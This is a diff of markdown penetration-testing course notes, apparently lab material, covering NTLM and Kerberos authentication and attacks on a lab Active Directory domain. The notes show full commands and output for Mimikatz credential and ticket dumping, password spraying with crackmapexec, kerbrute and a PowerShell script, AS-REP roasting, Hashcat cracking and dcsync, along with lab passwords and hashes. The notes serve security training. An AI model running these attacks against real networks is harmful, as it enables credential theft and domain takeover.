@@ -99,7 +99,7 @@ We briefly discussed what NTLM is and how to recover its hashes in Password Atta
 [NTLM auth](https://blogs.msdn.microsoft.com/chiranth/2013/09/20/ntlm-want-to-know-how-it-works/) is used to auth a client to a server when connecting by IP address, instead of hostname, or if the user attempts to auth to a hostname that is not registered on the AD integrated DNS server.  Also, 3rd party apps may use NTLM instead of Kerberos.
 
 The 7 steps of NTLM proto consist of:
-![da83831f0dd967c8c67585fcd2110c12.png](../_resources/da83831f0dd967c8c67585fcd2110c12.png)
+![da83831f0dd967c8c67585fcd2110c12.png](assets/static/resources/da83831f0dd967c8c67585fcd2110c12.png)
 
 In the first step the system calculates the cryto hash, known as NTLM hash, from the user's password.  Next, the client computer sends the username to the server, which returns a "nonce" or challenge.  The client encrypts the none using the NTLM hash and sends it in the response to the server.
 
@@ -120,7 +120,7 @@ MS Kerberos was adopted from Kerberos v5 created by MIT.  Kerberos has been the 
 In NTLM auth, the client starts the auth process with the app server itself, whereas in Kerberos auth the DC takes the role of a [Key Distribution Center (KDC)](https://blogs.msdn.microsoft.com/chiranth/2013/09/20/ntlm-want-to-know-how-it-works/).  The client starts the auth process with the KDC, not the app server.  A KDC service runs on each DC and is responsible for session tickets and temporary session keys to users and computers.
 
 The client auth process at a high level:
-![22acd580bc7d406fa3a4e26113a52ef3.png](../_resources/22acd580bc7d406fa3a4e26113a52ef3.png)
+![22acd580bc7d406fa3a4e26113a52ef3.png](assets/static/resources/22acd580bc7d406fa3a4e26113a52ef3.png)
 
 The process in detail; when a user logs in to a workstation, an Authentication Server Request (AS-REQ) is sent to the DC.  The DC acting as KDC also maintains the Auth Server Service.  The AS-REQ contains a timestamp encrypted using a hash derived from the password of the user and their username.
 
@@ -179,6 +179,7 @@ As an example, we will use Mimikatz to extract domain hashes on our Win 11 sys.
 Since `jeff` domain user is local admin on CLIENT75, we can launch a PowerShell with elevated privs. Let's try to connect to this machine as `jeff` with password `HenchmanPutridBonbon11` via RDP.
 
 Once connected, start a PS session as Admin.  We can start Mimikatz from this command prompt and enter `privilege::debug` to engage the `SeDebugPrivilege` priv, which allows us to interact with a proc owned by another account.
+
 ```powershell
 PS C:\Windows\system32> cd C:\Tools\
 PS C:\Tools> .\mimikatz.exe
@@ -193,9 +194,11 @@ PS C:\Tools> .\mimikatz.exe
 mimikatz # privilege::debug
 Privilege '20' OK
 ```
+
 Next we run `sekurlsa::logonpasswords` to dump the creds of all logged-on users with the [Sekurlsa](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa) module.
 
 This will dump the hashes of all logged on users of the current workstation/server, including remote logins like RDP sessions.
+
 ```bash
 mimikatz # sekurlsa::logonpasswords
 
@@ -308,6 +311,7 @@ SID               : S-1-5-21-1987370270-658905905-1781884369-1103
         cloudap :       KO
 ...
 ```
+
 The output shows the creds stored in LSASS for the domain users `jeff` and `dave` along with cached hashes.
 
 *An effective defensive technique to prevent tools such as Mimikatz from extracting hashes is to enable additional LSA Protection. The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process. We'll discuss how to bypass this and other powerful defensive mechanisms in-depth in OffSec's Evasion Techniques and Breaching Defenses course, PEN-300.*
@@ -319,6 +323,7 @@ We can attempt to crack the hashes to obtain cleartext passwords.
 Another approach is to use Mimikatz to exploit Kerberos auth by abusing TGT and service tickets.  We know that Kerberos TGT and service tickets for users logged on to the local machine are stored for future use, they are also stored in the LSASS, and we can use Mimikatz to retrieve our own tickets as well as those of other local users.
 
 Let's open a second PowerShell window and list the contents of the SMB share on WEB04 with UNC path `\\web04.corp.com\backup`, which will create a cached service ticket.  Once we've executed the directory list on the share we can use Mimikatz to show the tickets that are stored in memory by entering `sekurlsa::tickets`.
+
 ```bash
 mimikatz # sekurlsa::tickets
 
@@ -386,6 +391,7 @@ SID               : S-1-5-21-1987370270-658905905-1781884369-1103
            Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
 ...
 ```
+
 - Output shows both TGT and TGS.
  - Stealing TGS would allow us access only to particular resources associated with those tickets.
  - On the other hand, the TGT allows us to request a TGS for specific resources we want to target in the domain.
@@ -421,6 +427,7 @@ Previously we examined several password attacks on network services and hashed i
 Before going into detail, we must account for one important factor.  When running brute force or wordlist attacks, we must be aware of account lockouts.  A number of failed logins may result in the account being blocked and possibly alert the SA.
 
 To learn more about lockouts, review the domain account policy as domain user `jeff` on CLIENT75.  We can connect to the sys with password `HenchmanPutridBonbon11` via RDP, open PowerShell, and exec `net accounts` to obtain the account policy.
+
 ```powershell
 PS C:\Users\jeff> net accounts
 Force user logoff how long after time expires?:       Never
@@ -434,6 +441,7 @@ Lockout observation window (minutes):                 30
 Computer role:                                        WORKSTATION
 The command completed successfully.
 ```
+
 - Lockout threshold.
  - Limit of 5 login attempts before lockout.
   - We can safely attempt 4 logins before a lockout is triggered.
@@ -449,15 +457,18 @@ This would also generate a huge amount of network traffic.  Let's review 3 kinds
 The first uses LDAP and ADSI to perform a "low and slow" password spray attack against AD users.  We previously performed queries against the DC as a logged-in user with [DirectoryEntry](https://docs.microsoft.com/de-de/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0), but we can also make queries in the context of a different user by setting the DirectoryEntry instance.
 
 In the AD Introduction and Enumeration module we used `DirectoryEntry` constructor without args, but we can provide 3, including the LDAP path to the DC, the username, and the password.
+
 ```powershell
 PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
 distinguishedName : {DC=corp,DC=com}
 Path              : LDAP://DC1.corp.com/DC=corp,DC=com
 ```
+
 - As shown above, if the password of the user account is correct the object creation will be successful.
 
 If the password of the user account is invalid, no object will be created and we will receive an exception.  Let's change the password to `WrongPassword`, we will notice a warning that username/password is incorrect.
+
 ```powershell
 PS C:\Users\jeff> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "WrongPassword")
 format-default : The following exception occurred while retrieving member "distinguishedName":
@@ -473,6 +484,7 @@ We can use this technique to create a PowerShell script that enums all users and
 This password spray tactic is implemented in the PS script `C:\Tools\Spray-Passwords.ps1` on CLIENT75.
 
 The `-Pass` option allows us to set a single password to test or we can submit a word list with the `-File` option.  We can test admin accounts with the `-Admin` flag.  The PS script automatically identifies domain users and sprays passwords against them.
+
 ```powershell
 PS C:\Users\jeff> cd C:\Tools\
 PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
@@ -484,6 +496,7 @@ Users guessed are:
  'pete' with password: 'Nexus123!'
  'jen' with password: 'Nexus123!'
 ```
+
 - The spray attack succeeds, providing us 2 valid sets of creds with password `Nexus123!`
 
 The second password spray attack against AD leverages SMB.  This is one of the traditional password attacks in AD and has several drawbacks.  Example, for each auth attempt a full SMB connection has to be set up and then terminated.  This generates a lot of traffic making it very noisy, it's also very slow compared to other techniques.
@@ -493,6 +506,7 @@ We can use `crackmapexec` on Kali to perform this kind of password spray.  We se
 - `jen`
 - `pete`
 Then spray password `Nexus123!` against them.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ for u in dave jen pete; echo $u >> users.txt
@@ -523,16 +537,19 @@ SMB         192.168.242.75  445    CLIENT75         [-] corp.com\dave:Nexus123! 
 SMB         192.168.242.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
 SMB         192.168.242.75  445    CLIENT75         [+] corp.com\pete:Nexus123!
 ```
+
 - Crackmapexec identified the same valid creds as `Spray-Passwords.ps1`
 - NOTE: crackmapexec doesn't examine the password policy of the domain before starting, therefore we should be cautious about locking out user accounts with this method.
 
 As a bonus, the output also shows if the user with identified creds has admin privs on the target sys.  Example, `dave` is local admin on CLIENT75, use crackmapexec with the password `Flowers1` targeting this sys.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ crackmapexec smb 192.168.242.75 -u dave -p 'Flowers1' -d corp.com                   
 SMB         192.168.242.75  445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
 SMB         192.168.242.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
 ```
+
 - Crackmapexec added `Pwn3d!` to the output.
  - Indicating that `dave` has admin privs on the target sys.
  - This is an excellent way to determin the level of access we have without performing additional enum.
@@ -542,6 +559,7 @@ The third password spray attack is based on obtaining a TGT.  Example, using [ki
 We could use Bash scripting or a programing language of our choice to automate this method, or we can use the tool [kerbrute](https://github.com/ropnop/kerbrute) which implements this technique to spray passwords.  This tool is cross platform and can be used on both Linux and Windows.
 
 Let's use the Win version in `C:\Tools` to perform this attack.  To conduct the attack we need to specify the `passwordspray` command along with a list of usernames and the password to spray.  We'll also need to enter the domain `corp.com` as arg for `-d`.  Create a file `usernames.txt` in `C:\Tools` containing user names `pete`, `dave`, `jen`.
+
 ```powershell
 PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 
@@ -559,6 +577,7 @@ Version: v1.0.3 (9dad6e1) - 12/15/23 - Ronnie Flathers @ropnop
 2023/12/15 07:21:47 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
 2023/12/15 07:21:47 >  Done! Tested 3 logins (2 successes) in 0.028 seconds
 ```
+
 *If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.*
 
 For crackmap and kerbrute, we had to provide a list of usernames.  To obtain a list of all domain users, we can leverage techniques we learned in Active Directory Introduction and Enumeration or use the built-in user enumeration functions of both tools.
@@ -574,6 +593,7 @@ By default, the AD user account option *Do not require Kerberos preauthenticatio
 Let's perform this attack from our Kali machine first, then from Win.  On Kali, we can utilize [impacket-GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) to perform AS-REP roasting.  We'll need to enter the IP address of the DC for arg `-dc-ip`, the name of the output file in which the AS-REP hash will be stored in the Hashcat format for `-outputfile`, and `-request` to request the TGT.
 
 Then we need to specify the target auth info in the format `domain/user`.  This is the user we use for authentication.  For example, we'll use `pete` with password `Nexus123!` from the prior section.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec]
 └─$ impacket-GetNPUsers -dc-ip 192.168.242.70  -request -outputfile hashes.asreproast corp.com/pete     
@@ -588,10 +608,12 @@ dave  CN=Development Department,DC=corp,DC=com  2022-09-07 09:54:57.521205  2023
 
 $krb5asrep$23$dave@CORP.COM:84034d5b9fde766369bd77ebad4da7c3$55b32180de371d7a182a5c3a5f6738181fdbfdfad215168234c1253efb1c1663d194a25df0a849767c7fe91dee8035def92e4af99b10218dcd12a4e7f065d1045be082fe62d05786567cdf95495dc3ffe0fcc443abeef2906edb0ffc00cac751afd6c70f5a24adc47f11eda98d78c81c38318c2140a710e91813a858ff2c517302a939631286bd15bab95eeb48d2586958e77006ba15e8ca65555dcb8c36c4177b7317d1fc33195afaaba1b97090f9a5fb8a262e4794a11b55222e1636fcf652e78d334b761e776d34f79c9737674a22953f08de7869a314544b2c3c2d64a512fcbf3ce5
 ```
+
 - Shows that `dave` has the user account option *Do not require kerberos preauthentication* enabled.
  - It is vulnerable to AS-REP Roasting.
 
 The default hash format of `impacket-GetNPUsers` is compatible with Hashcat, so we must check the mode for AS-REP hash by grepping for "Kerberos" in the Hashcat help.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ hashcat --help | grep -i "Kerberos"                           
@@ -605,6 +627,7 @@ The default hash format of `impacket-GetNPUsers` is compatible with Hashcat, so 
   13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
   18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
 ```
+
 - The output shows the correct mode for AS-REP is `18200`
 
 We now have what we need to launch Hashcat and crack the AS-REP hash.  Run Hashcat with:
@@ -613,6 +636,7 @@ We now have what we need to launch Hashcat and crack the AS-REP hash.  Run Hashc
 - Wordlist `rockyou.txt`
 - Rule file `best64.rule`
 - `--force`
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
@@ -644,11 +668,13 @@ Hardware.Mon.#1..: Temp: 50c Util: 16%
 Started: Sat Dec 16 11:21:54 2023
 Stopped: Sat Dec 16 11:22:27 2023
 ```
+
 - Hashcat succeeds with password `Flowers1` for user `dave`
 
 We can also perform AS-REP Roasting on Windows.  We'll use [Rubeus](https://github.com/GhostPack/Rubeus), a toolset for raw Kerberos interactions and abuses.  To perform the attack we connect to CLIENT75 via RDP as domain user `jeff` with password `HenchmanPutridBonbon11`.
 
 Since we are performing the attack as a preauthenticated domain user, we need no other options except `asreproast`.  Rubeus will auto ID vulnerable user accounts.  Add the flag `/nowrap` to prevent new lines being added to the resulting AS-REP hashes.
+
 ```powershell
 PS C:\Tools> .\Rubeus.exe asreproast /nowrap
 
@@ -676,9 +702,11 @@ PS C:\Tools> .\Rubeus.exe asreproast /nowrap
 
       $krb5asrep$dave@corp.com:F3A56FE7D159384A8512C68CF8523759$9BCA3A38F6CFD6923909D403C65676F3AA53247046C198445705496921E972DBDFCD6C20836F9683283B532FE583E4F7B42B820E1CB4B90F35A17FE31CEE18C9FCB5C7D601BD09F6631FEE2634CEA6209FAB612F68C32B519A059D3B321DEC6A51D35CFA4D3C4271CB67DFF5C167838904846FB759824C77F6BDECB36771E0A06C5721BFDA8D9FDBBD18BEF37A7B9B05AB52C0A5F138584D9F59AA437505A761F8FA1A075B01389A560ADF6935852FD5C95456D975DA22D3616519D1F567B4C5EF08CFD61083A4303F7982F84120F3881EECBBD74D2F5E0E91BE0E2B2DAF2EAFE3CADBAD
 ```
+
 - Rubeus identified `dave` as vulnerable to AS-REP Roasting and displays the AS-REP hash.
 
 We can copy the hash and paste it into a text file `hashes.asreproast2` in the working dir of `kali` and run Hashcat again.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ sudo hashcat -m 18200 hashes.asreproast2 
@@ -709,6 +737,7 @@ Hardware.Mon.#1..: Temp: 42c Util: 30%
 Started: Sat Dec 16 11:54:03 2023
 Stopped: Sat Dec 16 11:54:06 2023
 ```
+
 - Hashcat succeeds in cracking the AS-REP.
 
 To identify users with *Do not require Kerberos preauthentication* option enabled in AD we can use PowerView's `Get-DomainUser` function with `-PreauthNotRequired` option on Win.  On kali, we could use `impacket-GetNPUsers` without the `-request` and `-outputfile` options.
@@ -734,6 +763,7 @@ To perform this attack, we use Mimikatz on a domain joined machine or [impacket-
 We'll start with Mimikatz and connect to CLIENT75 as `jeffadmin` with the password `BrouhahaTungPerorateBroom2023!`, as a member of the Domain Admins group we already have to required rights.
 
 To perform the attack with Mimikatz, we use `lsadump:dcsync` module and provide the domain username for which we want to obtain creds as the `/user:` arg.
+
 ```powershell
 PS C:\Tools> .\mimikatz.exe
 
@@ -827,6 +857,7 @@ Supplemental Credentials:
     28  4dc7a5887b16aadd37ef1ecc138a4346
     29  1039fd82b8826a73352cf31a26aba0cb
 ```
+
 - Mimikatz dcsync attack succeeds `Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494`
 
 Copy the NTLM hash into a file names `hashes.dcsync` on our Kali sys, we can crack using Hashcat.
@@ -834,6 +865,7 @@ Copy the NTLM hash into a file names `hashes.dcsync` on our Kali sys, we can cra
 - Wordlist `rockyou.txt`
 - Rule file `best64.rule`
 - Path to hash file and `--force`
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
@@ -841,11 +873,13 @@ Copy the NTLM hash into a file names `hashes.dcsync` on our Kali sys, we can cra
 
 08d7a47a6f9f66b97b1bae4178747494:Flowers1
 ```
+
 - We retrieve the plaintext password of `dave`
 
 We can now retrieve the NTLM hash of any domain user account on the corp.com domain, we can then attempt to crack the hashes and retrieve plaintext passwords of the accounts.
 
 We can perform the desync attack to obtain any user password hash in the domain, event the domain admin.
+
 ```bash
 mimikatz # lsadump::dcsync /user:corp\dave
 [DC] 'corp.com' will be the domain
@@ -875,6 +909,7 @@ Credentials:
 In upcoming module Lateral Movement in Active Directory we will discuss lateral movement vectors leveraging NTLM hashes obtained by dcsync.
 
 Next, let's perform a dcsync attack from Kali, using `imapcket-secretsdump`.  Enter target username `dave` as an arg for `-just-dc-user` and provide the creds of a user with required rights, along with a DC IP in the format `domain/user:password@ip`.
+
 ```bash
 ┌──(operator㉿labhost)-[~/OffSec/AD]
 └─$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.199.70
@@ -889,6 +924,7 @@ dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
 dave:des-cbc-md5:1a329b4338bfa215
 [*] Cleaning up...
 ```
+
 - We obtained the NTLM hash using [DRSUAPI](https://wiki.samba.org/index.php/DRSUAPI)
  - The MS API which implements Directory Replication Service Remote Protocol.
 
